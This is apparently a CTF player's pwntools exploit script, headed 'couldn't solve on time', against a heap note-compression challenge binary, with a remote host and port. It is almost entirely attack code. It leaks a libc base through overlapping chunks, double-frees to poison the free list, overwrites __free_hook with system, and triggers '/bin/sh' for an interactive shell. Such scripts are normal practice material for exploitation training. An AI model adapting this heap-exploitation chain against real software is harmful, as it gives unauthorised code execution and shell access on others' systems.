# couldn't solve on time...
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '123.216.69.60'
PORT = 4445

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def add(idx, text):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', text)

def compress(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

def decompress(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(idx))

def show(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter(': ', str(idx))

r = start()
if args.D:
    debug(r, [])
add(0, 'ab'*(6)+'\x31'*4)
add(1, 'c'*0x28)
add(2, p64(0x21)*0x100)
# add(3, p64(0x21)*0x100)
# add(4, p64(0x21)*0x100)
add(3, 'A'*0x48)
add(4, 'A'*0x88)

compress(0)
delete(1)
add(5, 'B'*0x18)
add(6, 'B'*0x18)
show(3)
r.recvuntil('content: ')
leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')

system = base + 0x55410
fh = base + 0x1eeb28
delete(5)
delete(6)
delete(5)
delete(2)

payload = ''
payload += flat(fh)
payload += 'D'*0x20
add(8, payload)
add(9, '/bin/sh\x00'+'E'*0x10)
# pause()
add(7, p64(system)+'F'*0x20)
delete(9)

r.interactive()
r.close()
